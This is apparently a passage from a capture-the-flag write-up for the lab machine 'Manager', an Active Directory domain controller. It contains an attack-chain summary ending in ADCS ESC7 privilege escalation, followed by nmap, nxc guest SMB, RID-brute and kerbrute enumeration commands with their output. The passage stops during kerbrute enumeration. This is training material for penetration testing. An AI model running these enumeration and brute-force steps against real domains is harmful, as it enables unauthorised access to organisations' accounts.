### Summary
We start the box with guest access to `smb`, allowing us to brute-force `RID`s, providing us with a username list. With an uninteresting website, we attempt to brute-force user logins with their usernames as passwords and get auth as `operator`. We use this auth to gain access to `MSSQL`, allowing us to perform `xp_dirtree` to see a hidden backup archive in the website's root folder. We extract the archive where stored is a plaintext password for `raven` who has `WinRM` access. With nothing interesting on the victim's box, we probe `ADCS` to find it's vulnerable to `ESC7`, allowing us to forge an admin ticket, giving us root auth

### Tools
- `nxc`
- `kerbrute` - brute-force list of users on kerberos
- `bloodhound`
- `mssqlclient.py`
- `evil-winrm`
- `certipy`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#nxc Host File Generation]]
- [[#SMB - TCP 445]]
- [[#Kerberos - TCP 88]]
- [[#HTTP - TCP 80]]
###### [[#User Auth - operator]]
- [[#Back to SMB]]
- [[#Bloodhound]]
- [[#MSSQL - TCP 1433]]
###### [[#User Shell - raven]]
- [[#Website-Backup]]
- [[#Enumeration as raven]]
- [[#ADCS]]
###### [[#Root Shell]]
- [[#ESC7]]
	- [[#exploit]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.5.156 -oN nmap/tcp              
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49685/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49687/tcp open  unknown          syn-ack ttl 127
49722/tcp open  unknown          syn-ack ttl 127
49732/tcp open  unknown          syn-ack ttl 127
```
```sh
❯ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49685,49686,49687,49722,49732 -sCV -vv 10.129.5.156 -oN nmap/tcpScripts                     
PORT      STATE    SERVICE       REASON          VERSION
53/tcp    open     domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open     http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Manager
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-02-24 04:25:23Z)
135/tcp   open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open     netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1: 2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-24T04:26:56+00:00; +7h00m00s from scanner time.
445/tcp   open     microsoft-ds? syn-ack ttl 127
464/tcp   open     kpasswd5?     syn-ack ttl 127
593/tcp   open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-24T04:26:56+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1: 2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
1433/tcp  open     ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: MANAGER
|   NetBIOS_Domain_Name: MANAGER
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: manager.htb
|   DNS_Computer_Name: dc01.manager.htb
|   DNS_Tree_Name: manager.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-24T04:22:22
| Not valid after:  2056-02-24T04:22:22
| MD5:   5c19 4170 fea6 0d50 0dd3 9e8e 629e 646d
| SHA-1: fdf3 d079 b3f0 6155 39a7 2889 18e5 f4cc 387d 1a7c
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQFF/pfcdZvLFAtYsqfnjkzjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjYwMjI0MDQyMjIyWhgPMjA1NjAyMjQwNDIyMjJaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALM4thNj
| dW3fDs+sAzYpyLCrHuP0sRmi/TrDT8VCy2UORm//WOFpfZ/5VLbmRsrQUYRlAFun
| GkJP/MjIRhmlkluWhRe+ltOj2V0ii8Y8g3QNNoWaTMH8bfjPjMpF5tC3Y2L1TrWC
| YRvdTGGcLK7hb/YANhadX7+nyVTG0w3pN9DugLTOV4mhA1LmsttRvB+ENb9/nxBH
| MZWr7T6hsb+240aSCv0zWkfeXGJY5NlF44l8xihl4nL2FpxddOtPWP9ugHSK38CQ
| 7LxMVrfe28dfWbNPvHqLRDthblC7C4+DWjJ/UnfSZCrPzwvF6wJEfQlz7jxcZycT
| ti21zEXZO3vX0z0CAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAAwH/6snZL1qE6V0n
| +9Dd0CI9z24TtONhsDwhgj9wemyLgdT36fjKSwYEn1JFMqTpwlh9MGrdEjPfa0i6
| 3tZlDHFbZaPhP9M2T388s2SCIY1H8rEScVUEt0P3FPtyvFfrnbW7KOUR3Tf72JTL
| onh1C64yiDpyMIhtgaNFKp22BHXqysWrfmQ2KHMDHou5z+TO8wQUcTLjLejrjrnw
| GZ0bCBKzBZ9pSDZCJpIRjv+XiIvyDyMx0tYNxfqCGkCL20+MN+LwRxYSmMReETYA
| wMwlIZbHmDGa/ziELGaccMrbK4/LxAeFZ5o/P9Yp+IN/Yt/LyA5IYu/ivYrky+h2
| o95gRg==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-24T04:26:56+00:00; +7h00m00s from scanner time.
3268/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-02-24T04:26:56+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1: 2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
3269/tcp  open     ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA/domainComponent=manager
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:   bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1: 2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
| -----BEGIN CERTIFICATE-----
| MIIFyDCCBLCgAwIBAgITXwAAABHDlIAulPWHxgAAAAAAETANBgkqhkiG9w0BAQsF
| ADBIMRMwEQYKCZImiZPyLGQBGRYDaHRiMRcwFQYKCZImiZPyLGQBGRYHbWFuYWdl
| cjEYMBYGA1UEAxMPbWFuYWdlci1EQzAxLUNBMCAXDTI0MDgzMDE3MDg1MVoYDzIx
| MjIwNzI3MTAzMTA0WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA
| 7Pt5jAgDiLnlXbCaEu5YkYU9UB5O36TnSqkMDx5/iXnxVmyynxCezA20S5wkZ+1R
| Zq4GN/KQ8IOZObRZ6uFc34KhOajObR12O4m7dxZLKLQwyv4ET21zlbHuwzcseMeP
| t8vm0eabezOlR0GW3yMSEElmg3Rtivd5a+k6yIfA1z0/9xIaQl61yYexwAS53+Iz
| 8IaPXPWkHr9ELxAdSMYJELiV8eG43KOQ28rqBNecz5eHYnvy0AKS1Kt7IODOHKwH
| FYfIrKcl3YIDE+IqSCv+gdKprfvfgspFrJgbDYEhDP93kHF06bbnttBKvCpu+FAC
| rg2AIyymVheJx8lJzgMeeQIDAQABo4IC7zCCAuswNQYJKwYBBAGCNxUHBCgwJgYe
| KwYBBAGCNxUIhunUf4LfwleDsYkm1dV5+6weIwEcAgFuAgECMCkGA1UdJQQiMCAG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAjAOBgNVHQ8BAf8EBAMCBaAw
| NQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcDAjAKBggrBgEFBQcDATAMBgorBgEE
| AYI3FAICMB0GA1UdDgQWBBTwZlQbixROyHC6vosxL0ZqZFx0EzAfBgNVHSMEGDAW
| gBQ6y/QuzYnIJDZmjzlYBg4ivzAOTDCBygYDVR0fBIHCMIG/MIG8oIG5oIG2hoGz
| bGRhcDovLy9DTj1tYW5hZ2VyLURDMDEtQ0EsQ049ZGMwMSxDTj1DRFAsQ049UHVi
| bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
| bixEQz1tYW5hZ2VyLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jh
| c2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcEGCCsGAQUFBwEB
| BIG0MIGxMIGuBggrBgEFBQcwAoaBoWxkYXA6Ly8vQ049bWFuYWdlci1EQzAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPW1hbmFnZXIsREM9aHRiP2NBQ2VydGlmaWNhdGU/
| YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MB4GA1UdEQEB
| /wQUMBKCEGRjMDEubWFuYWdlci5odGIwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEE
| AYI3GQIBoDAELlMtMS01LTIxLTQwNzgzODIyMzctMTQ5MjE4MjgxNy0yNTY4MTI3
| MjA5LTEwMDAwDQYJKoZIhvcNAQELBQADggEBABAdOIMcqsDOfZ/0R2p50BzXyavO
| MsA1XBGc31NOKaIg96/JxW/YQWyUSvqAcLWSegqXszFyngao6pqH5Biql9jZhD2X
| 8aaJzmiVZO2TtST49augfum5hQYiCIo/jAhKC6vnNl+pAjRZYEfv+PZqjsfDVBwC
| XRQJEpiIAmd05b/zrhz7VSceGWGAWvJievynjx0JCpe+61/s8w2hALvcdPcTRtCU
| oVfFTxa3zxBRmnqt2l/qAdUP0QlNJ12A0extUg1L7FIpH0uBdqhXGjqzPD5jLCG4
| CIuC4DNai+8mVyQYa6KHjod9QOGOUSeDVdeshf5le28sddSPiZhmvNRZF1E=
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-24T04:26:56+00:00; +7h00m00s from scanner time.
5985/tcp  open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49685/tcp open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49686/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49687/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49722/tcp open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
49732/tcp filtered unknown       no-response
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info:
|   10.129.5.156:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 63538/tcp): CLEAN (Timeout)
|   Check 2 (port 43106/tcp): CLEAN (Timeout)
|   Check 3 (port 35937/udp): CLEAN (Timeout)
|   Check 4 (port 12867/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-24T04:26:19
|_  start_date: N/A
```
- The TTL indicates a Windows box, the `IIS` version pointing to a Windows 10+ machine
- The running services indicate an AD domain
- Looks like a Certificate Authority (CA) is at play here, `manager-DC01-CA`
- Microsoft SQL Server 2019 is running, might be interesting
- Clock skew needs to be dealt with when we're running utilizing kerberos

### nxc Host File Generation
- We can do the standard host file generation with `nxc`
```sh
❯ nxc smb 10.129.5.156 --generate-hosts-file hosts
SMB         10.129.5.156    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
❯ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

## SMB - TCP 445
---
- We can check if we've got passwordless `smb` access via `nxc`:
```sh
❯ nxc smb 10.129.5.156 -u '' -p ''

❯ nxc smb 10.129.5.156 -u 'guest' -p ''
SMB         10.129.5.156    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.5.156    445    DC01             [+] manager.htb\guest: 
```
- Nice, we've got guest access!

- We can take a peek at the shares
```sh
❯ nxc smb 10.129.5.156 -u 'guest' -p '' --shares
ADMIN$                          Remote Admin        
C$                              Default share       
IPC$            READ            Remote IPC          
NETLOGON                        Logon server share  
SYSVOL                          Logon server share  
```
- We've got read access to `IPC$` but the shares are looking default and there's nothing in `IPC$`

- We can try to get user information
```sh
❯ nxc smb 10.129.5.156 -u 'guest' -p '' --users  
SMB         10.129.5.156    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.5.156    445    DC01             [+] manager.htb\guest: 
```

- Nothing interesting. We can try `rid` cycling for users as well
```sh
❯ nxc smb 10.129.5.156 -u 'guest' -p '' --rid-brute
1000: MANAGER\DC01$ (SidTypeUser)                             
1101: MANAGER\DnsAdmins (SidTypeAlias)                        
1102: MANAGER\DnsUpdateProxy (SidTypeGroup)                   
1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias) 
1113: MANAGER\Zhong (SidTypeUser)                             
1114: MANAGER\Cheng (SidTypeUser)                             
1115: MANAGER\Ryan (SidTypeUser)                              
1116: MANAGER\Raven (SidTypeUser)                             
1117: MANAGER\JinWoo (SidTypeUser)                            
1118: MANAGER\ChinHae (SidTypeUser)                           
1119: MANAGER\Operator (SidTypeUser)                          
```
- Nice! looks like we've got ourselves a user list

## Kerberos - TCP 88
---
- We could also gather a list of users using `kerbrute`
```sh
❯ kerbrute userenum -d manager.htb --dc dc01.manager.htb ~/ctf/TOOLS/wordlist/Usernames/cirt-default-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/23/26 - Ronnie Flathers @ropnop

2026/02/23 17:10:11 >  Using KDC(s):
2026/02/23 17:10:11 >   dc01.manager.htb:88

2026/02/23 17:10:11 >  [+] VALID USERNAME:       ADMINISTRATOR@manager.htb
2026/02/23 17:10:11 >  [+] VALID USERNAME:       Administrator@manager.htb
